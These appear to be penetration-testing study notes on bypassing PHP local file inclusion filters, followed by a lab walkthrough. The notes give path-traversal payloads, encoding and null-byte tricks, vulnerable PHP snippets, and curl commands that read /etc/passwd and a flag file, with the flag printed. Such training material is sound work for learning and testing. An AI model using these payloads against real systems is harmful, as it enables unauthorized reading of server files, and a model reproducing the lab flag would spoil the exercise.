# Section 3 — Basic LFI Bypasses

---

## Filter Categories You'll Encounter

| Filter | What it does | Bypass |
|--------|-------------|--------|
| `str_replace('../', '')` non-recursive | Strips `../` once | Recursive payload: `....//`, `..././` |
| Char blocklist (`.`, `/` denied) | Rejects raw traversal chars | URL-encode: `%2e%2e%2f` or double-encode |
| Regex-approved path (`^./languages/`) | Only paths matching pattern accepted | Start with approved prefix, then traverse |
| Appended extension (`.php` added) | Forces inclusion to be `.php` only | Wrappers (next section), null byte (PHP < 5.3) |

---

## Bypass 1 — Non-Recursive `../` Removal

```php
$language = str_replace('../', '', $_GET['language']);
include("./languages/" . $language);
```

The filter runs once on the input → output isn't re-checked. Craft a payload where removal **leaves a valid traversal**.

Working payloads:
```
....//....//....//etc/passwd     → after one strip → ../../../etc/passwd
..././..././..././etc/passwd     → after one strip → ../../../etc/passwd
....\/....\/....\/etc/passwd     → escaped slash variant
....////....////etc/passwd       → extra-slash variant
```

The trick: `....//` contains `../` once. Strip it → `../` remains. The `....//` pattern collapses to `../`.

---

## Bypass 2 — URL Encoding

Used when `.` or `/` are denylisted in raw form. Works on PHP ≤ 5.3.4 core filter and on **any** custom regex/string filter that only inspects raw chars.

```
../  → %2e%2e%2f
/    → %2f
.    → %2e
```

Full payload:
```
?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

If single-encode is filtered, **double-encode** (some WAFs decode once before checking):
```
../  → %252e%252e%252f
```

Build with Python:
```python
from urllib.parse import quote
p = quote('../../../../etc/passwd', safe='')
# %2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
```

Or Burp Decoder → URL-encode all characters.

---

## Bypass 3 — Approved-Path Regex

```php
if (preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
}
```

The regex requires the path to **start** with `./languages/`. Satisfy the regex, then traverse out:
```
?language=./languages/../../../../etc/passwd
```

The included file resolves through `./languages/`, then `../` takes you back to `/`, then absolute path to target.

> Find the approved path by inspecting the legitimate links (`href="index.php?language=languages/en.php"` → approved prefix is `languages/`).

---

## Bypass 4 — Combining Filters (this section's lab)

Real targets stack filters. The lab has **both**:
1. Approved path required (`languages/...`)
2. Non-recursive `../` strip

So you need **both** bypasses chained:
```
?language=languages/....//....//....//etc/passwd
```
- `languages/` passes the regex
- `....//` survives the strip (each becomes `../` after the one-pass replace)

---

## Bypass 5 — Path Truncation (PHP < 5.3)

PHP truncates strings > 4096 chars. Append a long `./` chain to push the appended `.php` past the limit so it gets cut.

```bash
echo -n "non_existing/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

> Obsolete on modern PHP (≥ 5.3). Try only when fingerprinting reveals old PHP.

---

## Bypass 6 — Null Byte (PHP < 5.3.4)

Null byte terminates the string in C-style internals — anything after is ignored.
```
?language=/etc/passwd%00
```
With `include($_GET['language'] . ".php")` → final path is `/etc/passwd\0.php` → C considers it `/etc/passwd`.

> Patched in PHP 5.3.4 (2010). Still relevant for legacy apps and CTFs.

---

## Lab — Combined Filter Bypass

**Target:** `154.57.164.80:31040` — same Inlane Freight app but with two filters layered.

### Probing the filters

```bash
# Plain absolute path:
curl "http://TARGET/index.php?language=../../../../etc/passwd"
# → "Illegal path specified!"    (regex filter rejects — no /languages prefix)

# With approved prefix + plain traversal:
curl "http://TARGET/index.php?language=languages/../../../etc/passwd"
# → file not found              (regex passes, but ../ stripped → languages/etc/passwd)

# With approved prefix + recursive traversal:
curl "http://TARGET/index.php?language=languages/....//....//....//etc/passwd"
# → /etc/passwd contents        ✅ both filters bypassed
```

### Read the flag

```bash
curl -sk "http://154.57.164.80:31040/index.php?language=languages/....//....//....//....//flag.txt" \
  | grep -iE 'HTB\{'
```

**Flag:** `HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}`

> Add an extra `....//` for safety — the flag is at root `/flag.txt`, so 4-5 hops is fine.

---

## Exam Notes

- The "filter combination" pattern is the canonical CPTS LFI bypass question — combine approved-path + recursive-strip
- When stuck: identify each filter independently. Test with just one bypass technique at a time, then layer them.
- `....//` is the universal recursive-strip bypass. Remember it as one literal string — it survives `str_replace('../', '')` and resolves to `../`
- URL-encode payloads work even when no filter is visible — modern WAFs often miss `%2e%2e%2f`
- If the response shows a verbose PHP `failed to open stream` error, you have a powerful oracle — the error shows the exact final path string
- Don't waste time on truncation/null-byte unless server banner reveals legacy PHP
